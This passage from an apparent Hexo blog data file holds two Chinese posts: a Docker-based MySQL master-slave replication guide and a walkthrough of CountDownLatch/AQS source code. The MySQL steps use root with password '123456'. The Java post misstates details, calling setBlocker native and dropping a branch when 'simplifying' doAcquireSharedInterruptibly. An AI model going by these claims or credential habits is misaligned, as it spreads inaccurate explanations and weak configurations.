/etc/mysql/mysql.conf.d/mysqld.cnf`  添加两行  \n\n    ```\n    server-id               = 1\n    log_bin                 = /var/log/mysql/mysql-bin.log\n    ```\n4. 重启MySQL `service mysql restart` \n5. 退出容器    `ctrl + p && ctrl + q`  \n6. 从MySQL环境：`docker run -it --name=slave --network=nw-ms --network-alias=slave uetty/mysql:5.7.23`  \n7. `vim /etc/mysql/mysql.conf.d/mysqld.cnf`  添加两行  \n   ` server-id               = 100 `  \n   ` log_bin                 = /var/log/mysql/mysql-bin.log `  \n8. 修改从服务器UUID使其不跟主服务器一样（使用docker部署同一台机子上会出现uuid一样的情况）`vim /var/lib/mysql/auto.cnf`  \n9. 重启MySQL `service mysql restart` \n10. 退出容器 `ctrl + p && ctrl + q`  \n\n## 创建从服务器登陆主服务器账号并授权\n1. 进入主服务器 `docker exec -it master bash`  \n2. 登陆mysql：`mysql -uroot -p123456`  \n3. 创建账号并授权\n    `create user root@'slave.nw-ms' identified by '123456';`  登陆用户ip限制根据需要随意放宽  \n    `grant replication slave on *.* to 'root'@'slave.nw-ms' identified by ‘123456’;`  \n    `flush privileges;`\n4. 查看当前log文件名及位置作为同步起始点（保证主库停止更新的情况下，如果还有更新任务，应暂时锁表禁止更新`FLUSH TABLES WITH READ LOCK`，待主从库数据相同，并且记录下主库file和position之后再解除`UNLOCK TABLES;`）\n    `show master status;` 如下所示，记录下File和Position\n```\n+------------------+----------+--------------+------------------+-------------------+\n| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |\n+------------------+----------+--------------+------------------+-------------------+\n| mysql-bin.000001 |      752 |              |                  |                   |\n+------------------+----------+--------------+------------------+-------------------+\n```\n5. 退出主服务器`ctrl + p && ctrl + q`  \n\n## 从服务器配置\n确保从服务器数据与主服务器相同\n1. 进入从服务器 `docker exec -it slave bash`  \n2. 登陆mysql：`mysql -uroot -p123456`  \n3. 设置同步参数 `change master to master_host='master', master_user='root', master_password='123456', master_log_file='mysql-bin.000001', master_log_pos=752;`   注：此处`master_host`对应docker容器运行时的`--network-alias`，也可直接使用ip地址，`master_log_file`和`master_log_pos`即对应前面`show master status;`所显示的数据  \n4. 开始同步 `start slave;`  \n5. 验证是否成功 `show slave status\\G`，查看列出的信息内的以下两个参数值是否不为NO，否则同步失败，若同步失败可关注`Last_IO_Error`参数找出同步失败原因\n```\nSlave_IO_Running: Yes  \nSlave_SQL_Running: Yes  \n```\n6. 最后就可以在主库中写一些数据试试看了\n","source":"_posts/2018-12-30_mysql.md","raw":"---\ntitle: MySQL主从同步配置\ndate: 2018-12-30 13:23:29\ntags: mysql\npermalink: mysql-slave\nkeywords: mysql, 主从同步\nrId: MB-18123001\n---\n\n为了方便操作，这里使用docker\n\n## 环境准备\n1. 创建网桥 `docker network create nw-ms`  \n2. 主MySQL环境：`docker run -it --name=master --network=nw-ms --network-alias=master uetty/mysql:5.7.23`  \n3. `vim /etc/mysql/mysql.conf.d/mysqld.cnf`  添加两行  \n\n    ```\n    server-id               = 1\n    log_bin                 = /var/log/mysql/mysql-bin.log\n    ```\n4. 重启MySQL `service mysql restart` \n5. 退出容器    `ctrl + p && ctrl + q`  \n6. 从MySQL环境：`docker run -it --name=slave --network=nw-ms --network-alias=slave uetty/mysql:5.7.23`  \n7. `vim /etc/mysql/mysql.conf.d/mysqld.cnf`  添加两行  \n   ` server-id               = 100 `  \n   ` log_bin                 = /var/log/mysql/mysql-bin.log `  \n8. 修改从服务器UUID使其不跟主服务器一样（使用docker部署同一台机子上会出现uuid一样的情况）`vim /var/lib/mysql/auto.cnf`  \n9. 重启MySQL `service mysql restart` \n10. 退出容器 `ctrl + p && ctrl + q`  \n\n## 创建从服务器登陆主服务器账号并授权\n1. 进入主服务器 `docker exec -it master bash`  \n2. 登陆mysql：`mysql -uroot -p123456`  \n3. 创建账号并授权\n    `create user root@'slave.nw-ms' identified by '123456';`  登陆用户ip限制根据需要随意放宽  \n    `grant replication slave on *.* to 'root'@'slave.nw-ms' identified by ‘123456’;`  \n    `flush privileges;`\n4. 查看当前log文件名及位置作为同步起始点（保证主库停止更新的情况下，如果还有更新任务，应暂时锁表禁止更新`FLUSH TABLES WITH READ LOCK`，待主从库数据相同，并且记录下主库file和position之后再解除`UNLOCK TABLES;`）\n    `show master status;` 如下所示，记录下File和Position\n```\n+------------------+----------+--------------+------------------+-------------------+\n| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |\n+------------------+----------+--------------+------------------+-------------------+\n| mysql-bin.000001 |      752 |              |                  |                   |\n+------------------+----------+--------------+------------------+-------------------+\n```\n5. 退出主服务器`ctrl + p && ctrl + q`  \n\n## 从服务器配置\n确保从服务器数据与主服务器相同\n1. 进入从服务器 `docker exec -it slave bash`  \n2. 登陆mysql：`mysql -uroot -p123456`  \n3. 设置同步参数 `change master to master_host='master', master_user='root', master_password='123456', master_log_file='mysql-bin.000001', master_log_pos=752;`   注：此处`master_host`对应docker容器运行时的`--network-alias`，也可直接使用ip地址，`master_log_file`和`master_log_pos`即对应前面`show master status;`所显示的数据  \n4. 开始同步 `start slave;`  \n5. 验证是否成功 `show slave status\\G`，查看列出的信息内的以下两个参数值是否不为NO，否则同步失败，若同步失败可关注`Last_IO_Error`参数找出同步失败原因\n```\nSlave_IO_Running: Yes  \nSlave_SQL_Running: Yes  \n```\n6. 最后就可以在主库中写一些数据试试看了\n","slug":"mysql-slave","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi0620010g0uk24mk2fj2","content":"<p>为了方便操作，这里使用docker</p>\n<h2 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h2><ol>\n<li><p>创建网桥 <code>docker network create nw-ms</code>  </p>\n</li>\n<li><p>主MySQL环境：<code>docker run -it --name=master --network=nw-ms --network-alias=master uetty/mysql:5.7.23</code>  </p>\n</li>\n<li><p><code>vim /etc/mysql/mysql.conf.d/mysqld.cnf</code>  添加两行  </p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server-id               = 1</span><br><span class=\"line\">log_bin                 = /var/log/mysql/mysql-bin.log</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>重启MySQL <code>service mysql restart</code> </p>\n</li>\n<li><p>退出容器    <code>ctrl + p &amp;&amp; ctrl + q</code>  </p>\n</li>\n<li><p>从MySQL环境：<code>docker run -it --name=slave --network=nw-ms --network-alias=slave uetty/mysql:5.7.23</code>  </p>\n</li>\n<li><p><code>vim /etc/mysql/mysql.conf.d/mysqld.cnf</code>  添加两行<br><code>server-id               = 100</code><br><code>log_bin                 = /var/log/mysql/mysql-bin.log</code>  </p>\n</li>\n<li><p>修改从服务器UUID使其不跟主服务器一样（使用docker部署同一台机子上会出现uuid一样的情况）<code>vim /var/lib/mysql/auto.cnf</code>  </p>\n</li>\n<li><p>重启MySQL <code>service mysql restart</code> </p>\n</li>\n<li><p>退出容器 <code>ctrl + p &amp;&amp; ctrl + q</code>  </p>\n</li>\n</ol>\n<h2 id=\"创建从服务器登陆主服务器账号并授权\"><a href=\"#创建从服务器登陆主服务器账号并授权\" class=\"headerlink\" title=\"创建从服务器登陆主服务器账号并授权\"></a>创建从服务器登陆主服务器账号并授权</h2><ol>\n<li><p>进入主服务器 <code>docker exec -it master bash</code>  </p>\n</li>\n<li><p>登陆mysql：<code>mysql -uroot -p123456</code>  </p>\n</li>\n<li><p>创建账号并授权<br> <code>create user root@&#39;slave.nw-ms&#39; identified by &#39;123456&#39;;</code>  登陆用户ip限制根据需要随意放宽<br> <code>grant replication slave on *.* to &#39;root&#39;@&#39;slave.nw-ms&#39; identified by ‘123456’;</code><br> <code>flush privileges;</code></p>\n</li>\n<li><p>查看当前log文件名及位置作为同步起始点（保证主库停止更新的情况下，如果还有更新任务，应暂时锁表禁止更新<code>FLUSH TABLES WITH READ LOCK</code>，待主从库数据相同，并且记录下主库file和position之后再解除<code>UNLOCK TABLES;</code>）<br> <code>show master status;</code> 如下所示，记录下File和Position</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+------------------+----------+--------------+------------------+-------------------+</span><br><span class=\"line\">| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |</span><br><span class=\"line\">+------------------+----------+--------------+------------------+-------------------+</span><br><span class=\"line\">| mysql-bin.000001 |      752 |              |                  |                   |</span><br><span class=\"line\">+------------------+----------+--------------+------------------+-------------------+</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>退出主服务器<code>ctrl + p &amp;&amp; ctrl + q</code>  </p>\n</li>\n</ol>\n<h2 id=\"从服务器配置\"><a href=\"#从服务器配置\" class=\"headerlink\" title=\"从服务器配置\"></a>从服务器配置</h2><p>确保从服务器数据与主服务器相同</p>\n<ol>\n<li><p>进入从服务器 <code>docker exec -it slave bash</code>  </p>\n</li>\n<li><p>登陆mysql：<code>mysql -uroot -p123456</code>  </p>\n</li>\n<li><p>设置同步参数 <code>change master to master_host=&#39;master&#39;, master_user=&#39;root&#39;, master_password=&#39;123456&#39;, master_log_file=&#39;mysql-bin.000001&#39;, master_log_pos=752;</code>   注：此处<code>master_host</code>对应docker容器运行时的<code>--network-alias</code>，也可直接使用ip地址，<code>master_log_file</code>和<code>master_log_pos</code>即对应前面<code>show master status;</code>所显示的数据  </p>\n</li>\n<li><p>开始同步 <code>start slave;</code>  </p>\n</li>\n<li><p>验证是否成功 <code>show slave status\\G</code>，查看列出的信息内的以下两个参数值是否不为NO，否则同步失败，若同步失败可关注<code>Last_IO_Error</code>参数找出同步失败原因</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Slave_IO_Running: Yes  </span><br><span class=\"line\">Slave_SQL_Running: Yes</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>最后就可以在主库中写一些数据试试看了</p>\n</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<p>为了方便操作，这里使用docker</p>\n<h2 id=\"环境准备\"><a href=\"#环境准备\" class=\"headerlink\" title=\"环境准备\"></a>环境准备</h2><ol>\n<li><p>创建网桥 <code>docker network create nw-ms</code>  </p>\n</li>\n<li><p>主MySQL环境：<code>docker run -it --name=master --network=nw-ms --network-alias=master uetty/mysql:5.7.23</code>  </p>\n</li>\n<li><p><code>vim /etc/mysql/mysql.conf.d/mysqld.cnf</code>  添加两行  </p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server-id               = 1</span><br><span class=\"line\">log_bin                 = /var/log/mysql/mysql-bin.log</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>重启MySQL <code>service mysql restart</code> </p>\n</li>\n<li><p>退出容器    <code>ctrl + p &amp;&amp; ctrl + q</code>  </p>\n</li>\n<li><p>从MySQL环境：<code>docker run -it --name=slave --network=nw-ms --network-alias=slave uetty/mysql:5.7.23</code>  </p>\n</li>\n<li><p><code>vim /etc/mysql/mysql.conf.d/mysqld.cnf</code>  添加两行<br><code>server-id               = 100</code><br><code>log_bin                 = /var/log/mysql/mysql-bin.log</code>  </p>\n</li>\n<li><p>修改从服务器UUID使其不跟主服务器一样（使用docker部署同一台机子上会出现uuid一样的情况）<code>vim /var/lib/mysql/auto.cnf</code>  </p>\n</li>\n<li><p>重启MySQL <code>service mysql restart</code> </p>\n</li>\n<li><p>退出容器 <code>ctrl + p &amp;&amp; ctrl + q</code>  </p>\n</li>\n</ol>\n<h2 id=\"创建从服务器登陆主服务器账号并授权\"><a href=\"#创建从服务器登陆主服务器账号并授权\" class=\"headerlink\" title=\"创建从服务器登陆主服务器账号并授权\"></a>创建从服务器登陆主服务器账号并授权</h2><ol>\n<li><p>进入主服务器 <code>docker exec -it master bash</code>  </p>\n</li>\n<li><p>登陆mysql：<code>mysql -uroot -p123456</code>  </p>\n</li>\n<li><p>创建账号并授权<br> <code>create user root@&#39;slave.nw-ms&#39; identified by &#39;123456&#39;;</code>  登陆用户ip限制根据需要随意放宽<br> <code>grant replication slave on *.* to &#39;root&#39;@&#39;slave.nw-ms&#39; identified by ‘123456’;</code><br> <code>flush privileges;</code></p>\n</li>\n<li><p>查看当前log文件名及位置作为同步起始点（保证主库停止更新的情况下，如果还有更新任务，应暂时锁表禁止更新<code>FLUSH TABLES WITH READ LOCK</code>，待主从库数据相同，并且记录下主库file和position之后再解除<code>UNLOCK TABLES;</code>）<br> <code>show master status;</code> 如下所示，记录下File和Position</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+------------------+----------+--------------+------------------+-------------------+</span><br><span class=\"line\">| File             | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |</span><br><span class=\"line\">+------------------+----------+--------------+------------------+-------------------+</span><br><span class=\"line\">| mysql-bin.000001 |      752 |              |                  |                   |</span><br><span class=\"line\">+------------------+----------+--------------+------------------+-------------------+</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>退出主服务器<code>ctrl + p &amp;&amp; ctrl + q</code>  </p>\n</li>\n</ol>\n<h2 id=\"从服务器配置\"><a href=\"#从服务器配置\" class=\"headerlink\" title=\"从服务器配置\"></a>从服务器配置</h2><p>确保从服务器数据与主服务器相同</p>\n<ol>\n<li><p>进入从服务器 <code>docker exec -it slave bash</code>  </p>\n</li>\n<li><p>登陆mysql：<code>mysql -uroot -p123456</code>  </p>\n</li>\n<li><p>设置同步参数 <code>change master to master_host=&#39;master&#39;, master_user=&#39;root&#39;, master_password=&#39;123456&#39;, master_log_file=&#39;mysql-bin.000001&#39;, master_log_pos=752;</code>   注：此处<code>master_host</code>对应docker容器运行时的<code>--network-alias</code>，也可直接使用ip地址，<code>master_log_file</code>和<code>master_log_pos</code>即对应前面<code>show master status;</code>所显示的数据  </p>\n</li>\n<li><p>开始同步 <code>start slave;</code>  </p>\n</li>\n<li><p>验证是否成功 <code>show slave status\\G</code>，查看列出的信息内的以下两个参数值是否不为NO，否则同步失败，若同步失败可关注<code>Last_IO_Error</code>参数找出同步失败原因</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Slave_IO_Running: Yes  </span><br><span class=\"line\">Slave_SQL_Running: Yes</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>最后就可以在主库中写一些数据试试看了</p>\n</li>\n</ol>\n"},{"title":"CountDownLatch源码阅读","date":"2019-02-09T07:05:55.000Z","keywords":"countdownlatch","rId":"MB-19020901","_content":"\n## await方法如何实现线程等待\n`await`方法，由`CountDownLatch.Sync.acquireSharedInterruptibly`代理完成，实际上由Sync的父类`AbstractQueuedSynchronizer`实现了该方法\n```\n    public final void acquireSharedInterruptibly(int arg)\n            throws InterruptedException {\n        if (Thread.interrupted())\n            throw new InterruptedException();\n        if (tryAcquireShared(arg) < 0)\n            doAcquireSharedInterruptibly(arg);\n    }\n```\n由于arg参数入参固定为1, 而Sync实现的`tryAcquireShared`方法对于入参数1返回-1，因此实际相当于调用了如下代码，`Thread.interrupted`确保了当前线程不是interrupted的状态\n```\n    public final void acquireSharedInterruptibly(int arg)\n            throws InterruptedException {\n        if (Thread.interrupted())\n            throw new InterruptedException();\n        doAcquireSharedInterruptibly(arg);\n    }\n```\n`AbstractQueuedSynchronizer`类的`doAcquireSharedInterruptibly`方法，其中`addWaiter`方法是往Node链表最后增加一个Node节点并返回该节点，Node对象中存储了当前线程t\n```\n    private void doAcquireSharedInterruptibly(int arg)\n        throws InterruptedException {\n        final Node node = addWaiter(Node.SHARED);\n        boolean failed = true;\n        try {\n            for (;;) {\n                final Node p = node.predecessor();\n                if (p == head) {\n                    int r = tryAcquireShared(arg);\n                    if (r >= 0) {\n                        setHeadAndPropagate(node, r);\n                        p.next = null; // help GC\n                        failed = false;\n                        return;\n                    }\n                }\n                if (shouldParkAfterFailedAcquire(p, node) &&\n                    parkAndCheckInterrupt())\n                    throw new InterruptedException();\n            }\n        } finally {\n            if (failed)\n                cancelAcquire(node);\n        }\n    }\n```\n实际上由于arg值固定为1，上面方法相当于如下\n```\n    private void doAcquireSharedInterruptibly(int arg)\n        throws InterruptedException {\n        final Node node = addWaiter(Node.SHARED);\n        boolean failed = true;\n        try {\n            for (;;) {\n                final Node p = node.predecessor();\n                if (shouldParkAfterFailedAcquire(p, node) &&\n                    parkAndCheckInterrupt())\n                    throw new InterruptedException();\n            }\n        } finally {\n            if (failed)\n                cancelAcquire(node);\n        }\n    }\n```\n`shouldParkAfterFailedAcquire`方法判断当前新增的节点（node）的前置节点（p）是否持有信号，并在没有持有信号的情况下，使其变更为持有信号状态（使state值设为SIGNAL）。`doAcquireSharedInterruptibly`中for循环直到`shouldParkAfterFailedAcquire`方法判断node的前置节点持有信号时，才会调用`parkAndCheckInterrupt`方法。\n\n`parkAndCheckInterrupt`代码便是阻塞代码真正所在的位置，该功方法代码很简单，直接委托`LockSupport.park(this)`完成，`LockSupport.park(this)`代码如下\n```\n    public static void park(Object blocker) {\n        Thread t = Thread.currentThread();\n        setBlocker(t, blocker);\n        UNSAFE.park(false, 0L);\n        setBlocker(t, null);\n    }\n```\n`setBlocker`时native的方法，它的作用是将第二个参数存储在第一个参数（线程）的堆内存中（即这是一个直接操作堆内存存储的实现），上面`park`方法中`UNSAFE.park`为阻塞功能的实现，点进去看发现也是一个native修饰的方法，即真正阻塞功能的还是由底层实现的，没法看到具体的代码。\n\n## countDown方法如何实现计数递减并取消阻塞\n与`await`方法一样，`countDown`方法也是将工作委托给了Sync类的方法完成。`CountDownLatch.Sync.releaseShared`代理完成该功能，`CountDownLatch.Sync.releaseShared`实际上也是已经由Sync的父类`AbstractQueuedSynchronizer`实现了，该方法如下\n```\n    public final boolean releaseShared(int arg) {\n        if (tryReleaseShared(arg)) {\n            doReleaseShared();\n            return true;\n        }\n        return false;\n    }\n```\n`tryReleaseShared`方法尝试进行计数（即`state`）递减，`tryReleaseShared`方法中与前面一些方法一样，使用了原子性的方法`compareAndSetState`完成递减操作，该原子性操作保证了不会出现两次countDown之后`state`只递减一次的情况。当本次递减后计数达到0返回true，原先计数已经为0或者本次递减后计数不为0，返回false。`tryReleaseShared`返回true后，才能调用`doReleaseShared`完成Node恢复阻塞的线程。\n```\n    protected boolean tryReleaseShared(int releases) {\n        // Decrement count; signal when transition to zero\n        for (;;) {\n            int c = getState();\n            if (c == 0)\n                return false;\n            int nextc = c-1;\n            if (compareAndSetState(c, nextc))\n                return nextc == 0;\n        }\n    }\n```\n如下所示为`doReleaseShared`方法代码，当`ws == Node.SIGNAL`（持有信号）时，调用`compareAndSetWaitStatus`尝试使Node不再持有信号（state值从SIGNAL变为0，`compareAndSetWaitStatus`调用的`unsafe.compareAndSwapInt`方法是原子性的方法），释放信号成功则进行`unparkSuccessor`的调用，不成功则继续循环（一般另外一条线程同时操作这个node的时候才会导致不成功），当`ws == 0`时，将该Node标识转为PROPAGATE后不再作处理，这种情况基本与`CountDownLatch`的业务无关，只是`AbstractQueuedSynchronizer`对Node链表结构的维护工作\n```\n    private void doReleaseShared() {\n        for (;;) {\n            Node h = head;\n            if (h != null && h != tail) {\n                int ws = h.waitStatus;\n                if (ws == Node.SIGNAL) {\n                    if (!compareAndSetWaitStatus(h, Node.SIGNAL, 0))\n                        continue;            // loop to recheck cases\n                    unparkSuccessor(h);\n                }\n                else if (ws == 0 &&\n                         !compareAndSetWaitStatus(h, 0, Node.PROPAGATE))\n                    continue;                // loop on failed CAS\n            }\n            if (h == head)                   // loop if head changed\n                break;\n        }\n    }\n```\n最后`unparkSuccessor`方法，找到head Node的下一个Node s，找到阻塞的线程`s.thread`， 调用`LockSupport.unpark(s.thread)`解除线程阻塞（核心代码`UNSAFE.unpark(thread)`方法，是native方法，发现一点有意思的情况：该方法运行完会改变head的指向，虽然与这里研究的关系不大，但传入参数是thread却能改变Sync的head Node指针确是挺有意思的）\n```\nprivate void unparkSuccessor(Node node) {\n        \n        int ws = node.waitStatus;\n        if (ws < 0)\n            compareAndSetWaitStatus(node, ws, 0);\n\n        Node s = node.next;\n        if (s == null || s.waitStatus > 0) {\n            s = null;\n            for (Node t = tail; t != null && t != node; t = t.prev)\n                if (t.waitStatus <= 0)\n                    s = t;\n        }\n        if (s != null)\n            LockSupport.unpark(s.thread);\n    }\n```\n\n## 总结\nCountDownLatch基本由`CountDownLatch.Sync`代理，Sync大量调用了`sun.misc.Unsafe`的代码。使用Unsafe的用于改变变量值的原子性方法，减少一些锁的使用；另外一点是使用park和`sun.misc.Unsaft.park`和`sun.misc.Unsaft.unpark`方法来实现指定线程的阻塞与解除阻塞。可惜的是`sun.misc.Unsafe`类oracle并不开放给外部代码使用。\n","source":"_posts/2019-02-09_Source_CountDownLatch.md","raw":"---\ntitle: CountDownLatch源码阅读\ndate: 2019-02-09 15:05:55\ntags: java\npermalink: source-countdownlatch\nkeywords: countdownlatch\nrId: MB-19020901\n---\n\n## await方法如何实现线程等待\n`await`方法，由`CountDownLatch.Sync.acquireSharedInterruptibly`代理完成，实际上由Sync的父类`AbstractQueuedSynchronizer`实现了该方法\n```\n    public final void acquireSharedInterruptibly(int arg)\n            throws InterruptedException {\n        if (Thread.interrupted())\n            throw new InterruptedException();\n        if (tryAcquireShared(arg) < 0)\n            doAcquireSharedInterruptibly(arg);\n    }\n```\n由于arg参数入参固定为1, 而Sync实现的`tryAcquireShared`方法对于入参数1返回-1，因此实际相当于调用了如下代码，`Thread.interrupted`确保了当前线程不是interrupted的状态\n```\n    public final void acquireSharedInterruptibly(int arg)\n            throws InterruptedException {\n        if (Thread.interrupted())\n            throw new InterruptedException();\n        doAcquireSharedInterruptibly(arg);\n    }\n```\n`AbstractQueuedSynchronizer`类的`doAcquireSharedInterruptibly`方法，其中`addWaiter`方法是往Node链表最后增加一个Node节点并返回该节点，Node对象中存储了当前线程t\n```\n    private void doAcquireSharedInterruptibly(int arg)\n        throws InterruptedException {\n        final Node node = addWaiter(Node.SHARED);\n        boolean failed = true;\n        try {\n            for (;;) {\n                final Node p = node.predecessor();\n                if (p == head) {\n                    int r = tryAcquireShared(arg);\n                    if (r >= 0) {\n                        setHeadAndPropagate(node, r);\n                        p.next = null; // help GC\n                        failed = false;\n                        return;\n                    }\n                }\n                if (shouldParkAfterFailedAcquire(p, node) &&\n                    parkAndCheckInterrupt())\n                    throw new InterruptedException();\n            }\n        } finally {\n            if (failed)\n                cancelAcquire(node);\n        }\n    }\n```\n实际上由于arg值固定为1，上面方法相当于如下\n```\n    private void doAcquireSharedInterruptibly(int arg)\n        throws InterruptedException {\n        final Node node = addWaiter(Node.SHARED);\n        boolean failed = true;\n        try {\n            for (;;) {\n                final Node p = node.predecessor();\n                if (shouldParkAfterFailedAcquire(p, node) &&\n                    parkAndCheckInterrupt())\n                    throw new InterruptedException();\n            }\n        } finally {\n            if (failed)\n                cancelAcquire(node);\n        }\n    }\n```\n`shouldParkAfterFailedAcquire`方法判断当前新增的节点（node）的前置节点（p）是否持有信号，并在没有持有信号的情况下，使其变更为持有信号状态（使state值设为SIGNAL）。`doAcquireSharedInterruptibly`中for循环直到`shouldParkAfterFailedAcquire`方法判断node的前置节点持有信号时，才会调用`parkAndCheckInterrupt`方法。\n\n`parkAndCheckInterrupt`代码便是阻塞代码真正所在的位置，该功方法代码很简单，直接委托`LockSupport.park(this)`完成，`LockSupport.park(this)`代码如下\n```\n    public static void park(Object blocker) {\n        Thread t = Thread.currentThread();\n        setBlocker(t, blocker);\n        UNSAFE.park(false, 0L);\n        setBlocker(t, null);\n    }\n```\n`setBlocker`时native的方法，它的作用是将第二个参数存储在第一个参数（线程）的堆内存中（即这是一个直接操作堆内存存储的实现），上面`park`方法中`UNSAFE.park`为阻塞功能的实现，点进去看发现也是一个native修饰的方法，即真正阻塞功能的还是由底层实现的，没法看到具体的代码。\n\n## countDown方法如何实现计数递减并取消阻塞\n与`await`方法一样，`countDown`方法也是将工作委托给了Sync类的方法完成。`CountDownLatch.Sync.releaseShared`代理完成该功能，`CountDownLatch.Sync.releaseShared`实际上也是已经由Sync的父类`AbstractQueuedSynchronizer`实现了，该方法如下\n```\n    public final boolean releaseShared(int arg) {\n        if (tryReleaseShared(arg)) {\n            doReleaseShared();\n            return true;\n        }\n        return false;\n    }\n```\n`tryReleaseShared`方法尝试进行计数（即`state`）递减，`tryReleaseShared`方法中与前面一些方法一样，使用了原子性的方法`compareAndSetState`完成递减操作，该原子性操作保证了不会出现两次countDown之后`state`只递减一次的情况。当本次递减后计数达到0返回true，原先计数已经为0或者本次递减后计数不为0，返回false。`tryReleaseShared`返回true后，才能调用`doReleaseShared`完成Node恢复阻塞的线程。\n```\n    protected boolean tryReleaseShared(int releases) {\n        // Decrement count; signal when transition to zero\n        for (;;) {\n            int c = getState();\n            if (c == 0)\n                return false;\n            int nextc = c-1;\n            if (compareAndSetState(c, nextc))\n                return nextc == 0;\n        }\n    }\n```\n如下所示为`doReleaseShared`方法代码，当`ws == Node.SIGNAL`（持有信号）时，调用`compareAndSetWaitStatus`尝试使Node不再持有信号（state值从SIGNAL变为0，`compareAndSetWaitStatus`调用的`unsafe.compareAndSwapInt`方法是原子性的方法），释放信号成功则进行`unparkSuccessor`的调用，不成功则继续循环（一般另外一条线程同时操作这个node的时候才会导致不成功），当`ws == 0`时，将该Node标识转为PROPAGATE后不再作处理，这种情况基本与`CountDownLatch`的业务无关，只是`AbstractQueuedSynchronizer`对Node链表结构的维护工作\n```\n    private void doReleaseShared() {\n        for (;;) {\n            Node h = head;\n            if (h != null && h != tail) {\n                int ws = h.waitStatus;\n                if (ws == Node.SIGNAL) {\n                    if (!compareAndSetWaitStatus(h, Node.SIGNAL, 0))\n                        continue;            // loop to recheck cases\n                    unparkSuccessor(h);\n                }\n                else if (ws == 0 &&\n                         !compareAndSetWaitStatus(h, 0, Node.PROPAGATE))\n                    continue;                // loop on failed CAS\n            }\n            if (h == head)                   // loop if head changed\n                break;\n        }\n    }\n```\n最后`unparkSuccessor`方法，找到head Node的下一个Node s，找到阻塞的线程`s.thread`， 调用`LockSupport.unpark(s.thread)`解除线程阻塞（核心代码`UNSAFE.unpark(thread)`方法，是native方法，发现一点有意思的情况：该方法运行完会改变head的指向，虽然与这里研究的关系不大，但传入参数是thread却能改变Sync的head Node指针确是挺有意思的）\n```\nprivate void unparkSuccessor(Node node) {\n        \n        int ws = node.waitStatus;\n        if (ws < 0)\n            compareAndSetWaitStatus(node, ws, 0);\n\n        Node s = node.next;\n        if (s == null || s.waitStatus > 0) {\n            s = null;\n            for (Node t = tail; t != null && t != node; t = t.prev)\n                if (t.waitStatus <= 0)\n                    s = t;\n        }\n        if (s != null)\n            LockSupport.unpark(s.thread);\n    }\n```\n\n## 总结\nCountDownLatch基本由`CountDownLatch.Sync`代理，Sync大量调用了`sun.misc.Unsafe`的代码。使用Unsafe的用于改变变量值的原子性方法，减少一些锁的使用；另外一点是使用park和`sun.misc.Unsaft.park`和`sun.misc.Unsaft.unpark`方法来实现指定线程的阻塞与解除阻塞。可惜的是`sun.misc.Unsafe`类oracle并不开放给外部代码使用。\n","slug":"source-countdownlatch","published":1,"updated":"2020-01-23T08:21:31.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi0630011g0ukbj7gnrf4","content":"<h2 id=\"await方法如何实现线程等待\"><a href=\"#await方法如何实现线程等待\" class=\"headerlink\" title=\"await方法如何实现线程等待\"></a>await方法如何实现线程等待</h2><p><code>await</code>方法，由<code>CountDownLatch.Sync.acquireSharedInterruptibly</code>代理完成，实际上由Sync的父类<code>AbstractQueuedSynchronizer</code>实现了该方法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public final void acquireSharedInterruptibly(int arg)</span><br><span class=\"line\">        throws InterruptedException &#123;</span><br><span class=\"line\">    if (Thread.interrupted())</span><br><span class=\"line\">        throw new InterruptedException();</span><br><span class=\"line\">    if (tryAcquireShared(arg) &lt; 0)</span><br><span class=\"line\">        doAcquireSharedInterruptibly(arg);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>由于arg参数入参固定为1, 而Sync实现的<code>tryAcquireShared</code>方法对于入参数1返回-1，因此实际相当于调用了如下代码，<code>Thread.interrupted</code>确保了当前线程不是interrupted的状态</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public final void acquireSharedInterruptibly(int arg)</span><br><span class=\"line\">        throws InterruptedException &#123;</span><br><span class=\"line\">    if (Thread.interrupted())</span><br><span class=\"line\">        throw new 